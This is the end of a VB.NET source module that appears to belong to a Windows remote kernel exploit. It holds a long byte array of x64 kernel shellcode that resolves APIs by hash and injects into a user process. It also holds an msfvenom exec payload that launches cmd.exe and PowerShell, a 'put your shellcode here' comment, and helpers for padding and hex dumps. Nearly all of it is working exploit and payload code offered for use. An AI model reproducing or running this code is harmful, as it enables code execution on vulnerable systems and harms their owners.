                                    &HA8, &H1, &H0, &H0, &H48, &H83, &HEC, &H78, &H41, &H5F, &H41, &H5E, &H41, &H5D, &H41, &H5C,
                                    &H41, &H5B, &H41, &H5A, &H41, &H59, &H41, &H58, &H5D, &H5F, &H5E, &H5A, &H59, &H5B, &H58, &H65,
                                    &H48, &H8B, &H24, &H25, &H10, &H0, &H0, &H0, &HF, &H1, &HF8, &HFF, &H24, &H25, &HF8, &HF,
                                    &HD0, &HFF, &H56, &H41, &H57, &H41, &H56, &H41, &H55, &H41, &H54, &H53, &H55, &H48, &H89, &HE5,
                                    &H66, &H83, &HE4, &HF0, &H48, &H83, &HEC, &H20, &H4C, &H8D, &H35, &HE3, &HFF, &HFF, &HFF, &H65,
                                    &H4C, &H8B, &H3C, &H25, &H38, &H0, &H0, &H0, &H4D, &H8B, &H7F, &H4, &H49, &HC1, &HEF, &HC,
                                    &H49, &HC1, &HE7, &HC, &H49, &H81, &HEF, &H0, &H10, &H0, &H0, &H49, &H8B, &H37, &H66, &H81,
                                    &HFE, &H4D, &H5A, &H75, &HEF, &H41, &HBB, &H5C, &H72, &H11, &H62, &HE8, &H18, &H2, &H0, &H0,
                                    &H48, &H89, &HC6, &H48, &H81, &HC6, &H8, &H3, &H0, &H0, &H41, &HBB, &H7A, &HBA, &HA3, &H30,
                                    &HE8, &H3, &H2, &H0, &H0, &H48, &H89, &HF1, &H48, &H39, &HF0, &H77, &H11, &H48, &H8D, &H90,
                                    &H0, &H5, &H0, &H0, &H48, &H39, &HF2, &H72, &H5, &H48, &H29, &HC6, &HEB, &H8, &H48, &H8B,
                                    &H36, &H48, &H39, &HCE, &H75, &HE2, &H49, &H89, &HF4, &H31, &HDB, &H89, &HD9, &H83, &HC1, &H4,
                                    &H81, &HF9, &H0, &H0, &H1, &H0, &HF, &H8D, &H66, &H1, &H0, &H0, &H4C, &H89, &HF2, &H89,
                                    &HCB, &H41, &HBB, &H66, &H55, &HA2, &H4B, &HE8, &HBC, &H1, &H0, &H0, &H85, &HC0, &H75, &HDB,
                                    &H49, &H8B, &HE, &H41, &HBB, &HA3, &H6F, &H72, &H2D, &HE8, &HAA, &H1, &H0, &H0, &H48, &H89,
                                    &HC6, &HE8, &H50, &H1, &H0, &H0, &H41, &H81, &HF9, &HBF, &H77, &H1F, &HDD, &H75, &HBC, &H49,
                                    &H8B, &H1E, &H4D, &H8D, &H6E, &H10, &H4C, &H89, &HEA, &H48, &H89, &HD9, &H41, &HBB, &HE5, &H24,
                                    &H11, &HDC, &HE8, &H81, &H1, &H0, &H0, &H6A, &H40, &H68, &H0, &H10, &H0, &H0, &H4D, &H8D,
                                    &H4E, &H8, &H49, &HC7, &H1, &H0, &H10, &H0, &H0, &H4D, &H31, &HC0, &H4C, &H89, &HF2, &H31,
                                    &HC9, &H48, &H89, &HA, &H48, &HF7, &HD1, &H41, &HBB, &H4B, &HCA, &HA, &HEE, &H48, &H83, &HEC,
                                    &H20, &HE8, &H52, &H1, &H0, &H0, &H85, &HC0, &HF, &H85, &HC8, &H0, &H0, &H0, &H49, &H8B,
                                    &H3E, &H48, &H8D, &H35, &HE9, &H0, &H0, &H0, &H31, &HC9, &H66, &H3, &HD, &HD7, &H1, &H0,
                                    &H0, &H66, &H81, &HC1, &HF9, &H0, &HF3, &HA4, &H48, &H89, &HDE, &H48, &H81, &HC6, &H8, &H3,
                                    &H0, &H0, &H48, &H89, &HF1, &H48, &H8B, &H11, &H4C, &H29, &HE2, &H51, &H52, &H48, &H89, &HD1,
                                    &H48, &H83, &HEC, &H20, &H41, &HBB, &H26, &H40, &H36, &H9D, &HE8, &H9, &H1, &H0, &H0, &H48,
                                    &H83, &HC4, &H20, &H5A, &H59, &H48, &H85, &HC0, &H74, &H18, &H48, &H8B, &H80, &HC8, &H2, &H0,
                                    &H0, &H48, &H85, &HC0, &H74, &HC, &H48, &H83, &HC2, &H4C, &H8B, &H2, &HF, &HBA, &HE0, &H5,
                                    &H72, &H5, &H48, &H8B, &H9, &HEB, &HBE, &H48, &H83, &HEA, &H4C, &H49, &H89, &HD4, &H31, &HD2,
                                    &H80, &HC2, &H90, &H31, &HC9, &H41, &HBB, &H26, &HAC, &H50, &H91, &HE8, &HC8, &H0, &H0, &H0,
                                    &H48, &H89, &HC1, &H4C, &H8D, &H89, &H80, &H0, &H0, &H0, &H41, &HC6, &H1, &HC3, &H4C, &H89,
                                    &HE2, &H49, &H89, &HC4, &H4D, &H31, &HC0, &H41, &H50, &H6A, &H1, &H49, &H8B, &H6, &H50, &H41,
                                    &H50, &H48, &H83, &HEC, &H20, &H41, &HBB, &HAC, &HCE, &H55, &H4B, &HE8, &H98, &H0, &H0, &H0,
                                    &H31, &HD2, &H52, &H52, &H41, &H58, &H41, &H59, &H4C, &H89, &HE1, &H41, &HBB, &H18, &H38, &H9,
                                    &H9E, &HE8, &H82, &H0, &H0, &H0, &H4C, &H89, &HE9, &H41, &HBB, &H22, &HB7, &HB3, &H7D, &HE8,
                                    &H74, &H0, &H0, &H0, &H48, &H89, &HD9, &H41, &HBB, &HD, &HE2, &H4D, &H85, &HE8, &H66, &H0,
                                    &H0, &H0, &H48, &H89, &HEC, &H5D, &H5B, &H41, &H5C, &H41, &H5D, &H41, &H5E, &H41, &H5F, &H5E,
                                    &HC3, &HE9, &HB5, &H0, &H0, &H0, &H4D, &H31, &HC9, &H31, &HC0, &HAC, &H41, &HC1, &HC9, &HD,
                                    &H3C, &H61, &H7C, &H2, &H2C, &H20, &H41, &H1, &HC1, &H38, &HE0, &H75, &HEC, &HC3, &H31, &HD2,
                                    &H65, &H48, &H8B, &H52, &H60, &H48, &H8B, &H52, &H18, &H48, &H8B, &H52, &H20, &H48, &H8B, &H12,
                                    &H48, &H8B, &H72, &H50, &H48, &HF, &HB7, &H4A, &H4A, &H45, &H31, &HC9, &H31, &HC0, &HAC, &H3C,
                                    &H61, &H7C, &H2, &H2C, &H20, &H41, &HC1, &HC9, &HD, &H41, &H1, &HC1, &HE2, &HEE, &H45, &H39,
                                    &HD9, &H75, &HDA, &H4C, &H8B, &H7A, &H20, &HC3, &H4C, &H89, &HF8, &H41, &H51, &H41, &H50, &H52,
                                    &H51, &H56, &H48, &H89, &HC2, &H8B, &H42, &H3C, &H48, &H1, &HD0, &H8B, &H80, &H88, &H0, &H0,
                                    &H0, &H48, &H1, &HD0, &H50, &H8B, &H48, &H18, &H44, &H8B, &H40, &H20, &H49, &H1, &HD0, &H48,
                                    &HFF, &HC9, &H41, &H8B, &H34, &H88, &H48, &H1, &HD6, &HE8, &H78, &HFF, &HFF, &HFF, &H45, &H39,
                                    &HD9, &H75, &HEC, &H58, &H44, &H8B, &H40, &H24, &H49, &H1, &HD0, &H66, &H41, &H8B, &HC, &H48,
                                    &H44, &H8B, &H40, &H1C, &H49, &H1, &HD0, &H41, &H8B, &H4, &H88, &H48, &H1, &HD0, &H5E, &H59,
                                    &H5A, &H41, &H58, &H41, &H59, &H41, &H5B, &H41, &H53, &HFF, &HE0, &H56, &H41, &H57, &H55, &H48,
                                    &H89, &HE5, &H48, &H83, &HEC, &H20, &H41, &HBB, &HDA, &H16, &HAF, &H92, &HE8, &H4D, &HFF, &HFF,
                                    &HFF, &H31, &HC9, &H51, &H51, &H51, &H51, &H41, &H59, &H4C, &H8D, &H5, &H1A, &H0, &H0, &H0,
                                    &H5A, &H48, &H83, &HEC, &H20, &H41, &HBB, &H46, &H45, &H1B, &H22, &HE8, &H68, &HFF, &HFF, &HFF,
                                    &H48, &H89, &HEC, &H5D, &H41, &H5F, &H5E, &HC3}
        Return shellcode
    End Function

    Private Function GetShellcode() As Byte()
        'Put your shellcode here
        'Remember that you need x64 shellcode

        'msfvenom -a x64 --platform win -p windows/x64/exec CMD="cmd.exe /C start powershell.exe"
        Dim payload() As Byte = New Byte() {72, 131, 228, 240, 232, 192, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72,
                                            139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77,
                                            49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237,
                                            82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 139, 128, 136, 0, 0, 0, 72, 133, 192,
                                            116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65,
                                            139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224,
                                            117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139,
                                            12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65,
                                            88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 87, 255,
                                            255, 255, 93, 72, 186, 1, 0, 0, 0, 0, 0, 0, 0, 72, 141, 141, 1, 1, 0, 0, 65, 186, 49, 139, 111, 135,
                                            255, 213, 187, 240, 181, 162, 86, 65, 186, 166, 149, 189, 157, 255, 213, 72, 131, 196, 40, 60, 6, 124,
                                            10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 89, 65, 137, 218, 255, 213, 99, 109, 100, 46,
                                            101, 120, 101, 32, 47, 67, 32, 115, 116, 97, 114, 116, 32, 112, 111, 119, 101, 114, 115, 104, 101, 108,
                                            108, 46, 101, 120, 101, 0}

        Return payload
    End Function

    Private Function CreateByteArrWithValue(ByVal value As Integer, ByVal size As Integer) As Byte()
        Dim tmp() As Byte = New Byte(size - 1) {}
        For i As Integer = 0 To size - 1
            tmp(i) = value
        Next
        Return tmp
    End Function

    Private Function StrRvs(ByVal err_code As String) As String
        Dim newString As String = ""
        For i As Integer = err_code.Length - 1 To 0 Step -2
            newString &= err_code.Substring(i - 1, 2)
        Next
        Return newString
    End Function

    Private Sub printArray(ByVal arr() As Byte)
        Dim printLinebytes As String = ""
        Dim printLineText As String = ""
        Dim index As Integer = 0
        Dim offset_counter As Integer = 0
        For Each b As Byte In arr
            printLinebytes &= b.ToString("X2") & " "
            printLineText &= ChrW(CInt(b))
            index += 1
            If index = 16 Then
                Console.WriteLine("0x" & Format(offset_counter, "000000") & " " & printLinebytes & " " & printLineText)
                printLinebytes = ""
                printLineText = ""
                index = 0
                offset_counter += 10
            End If
        Next
    End Sub
End Module
